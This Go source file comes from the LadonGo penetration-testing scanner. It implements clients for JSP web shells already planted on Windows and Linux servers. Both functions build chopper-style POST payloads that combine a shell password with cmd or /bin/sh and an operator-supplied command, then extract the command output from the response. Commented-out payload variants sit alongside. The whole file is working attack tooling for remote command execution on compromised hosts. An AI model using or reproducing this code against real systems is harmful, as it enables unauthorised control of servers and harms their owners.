package rexec
//Ladon Scanner for golang 
//Author: k8gege
//K8Blog: http://k8gege.org/Ladon
//Github: https://github.com/k8gege/LadonGo
import (
	_"compress/gzip"
	//"encoding/base64"
	"fmt"
	"io/ioutil"
	"net/http"
	"regexp"
	"strings"
)
var WinJspShellHelp = func () {
    fmt.Println("Usage: Ladon WinJspShell url pwd cmd")
	fmt.Println("Example: Ladon WinJspShell http://192.168.1.8/1.jsp pass whoami")
}
var LnxJspShellHelp = func () {
    fmt.Println("Usage: Ladon LnxJspShell url pwd cmd")
	fmt.Println("Example: Ladon LnxJspShell http://192.168.1.8/1.jsp pass whoami")
}
func JspShellExecWin(url,pwd,cmdline string) {
	//payload := "echo '<result>';&"+cmdline+"&echo '</result>';"
	//encodeString := base64.StdEncoding.EncodeToString([]byte(payload))
	//data :=`tom=phpinfo();`
	//req, _ := http.NewRequest("POST", url, strings.NewReader(data))
	//data :=pwd+`=M&z0=UTF-8&z1=/ccmd&z2=cd+%2Fd+%22c%3A%5C%22%26`+cmdline+`%26echo+%5BS%5D%26cd%26echo+%5BE%5D`
	data :=pwd+`=M&z0=UTF-8&z1=/ccmd&z2=`+cmdline//+`%26echo+%5BS%5D%26cd%26echo+%5BE%5D`
	//data :=pwd+`=M&z0=UTF-8&z1=-c%2Fbin%2Fsh&z2=`+cmdline//+`%26echo+%5BS%5D%26cd%26echo+%5BE%5D`
	req, _ := http.NewRequest("POST", url, strings.NewReader(data))
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	//req.Header.Set("Accept-Encoding", "gzip,deflate")
	resp, err := (&http.Client{}).Do(req)
	if err != nil {
		fmt.Println("error")
	}
	body, err := ioutil.ReadAll(resp.Body)
	//fmt.Println(string(body))
	
	reg := regexp.MustCompile(`->\|(?s:(.*?))\|<-`)
	if reg == nil {
		fmt.Println("regex error")
		return
	}
	str := string(body)
	result := reg.FindAllStringSubmatch(str,-1)
	for _, text := range result {
		fmt.Println(text[1])
	}
	
}

func JspShellExecLnx(url,pwd,cmdline string) {
	//payload := "echo '<result>';&"+cmdline+"&echo '</result>';"
	//encodeString := base64.StdEncoding.EncodeToString([]byte(payload))
	//data :=`tom=phpinfo();`
	//req, _ := http.NewRequest("POST", url, strings.NewReader(data))
	//data :=pwd+`=M&z0=UTF-8&z1=/ccmd&z2=cd+%2Fd+%22c%3A%5C%22%26`+cmdline+`%26echo+%5BS%5D%26cd%26echo+%5BE%5D`
	//T0m=M&z0=UTF-8&z1=-c%2Fbin%2Fsh&z2=cd+%22%2Fopt%2F%22%3Bid%3Becho+%5BS%5D%3Bpwd%3Becho+%5BE%5D
	//data :=pwd+`=M&z0=UTF-8&z1=/ccmd&z2=`+cmdline//+`%26echo+%5BS%5D%26cd%26echo+%5BE%5D`
	data :=pwd+`=M&z0=UTF-8&z1=-c%2Fbin%2Fsh&z2=`+cmdline//+`%26echo+%5BS%5D%26cd%26echo+%5BE%5D`
	req, _ := http.NewRequest("POST", url, strings.NewReader(data))
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	//req.Header.Set("Accept-Encoding", "gzip,deflate")
	resp, err := (&http.Client{}).Do(req)
	if err != nil {
		fmt.Println("error")
	}
	body, err := ioutil.ReadAll(resp.Body)
	//fmt.Println(string(body))
	
	reg := regexp.MustCompile(`->\|(?s:(.*?))\|<-`)
	if reg == nil {
		fmt.Println("regex error")
		return
	}
	str := string(body)
	result := reg.FindAllStringSubmatch(str,-1)
	for _, text := range result {
		fmt.Println(text[1])
	}
	
}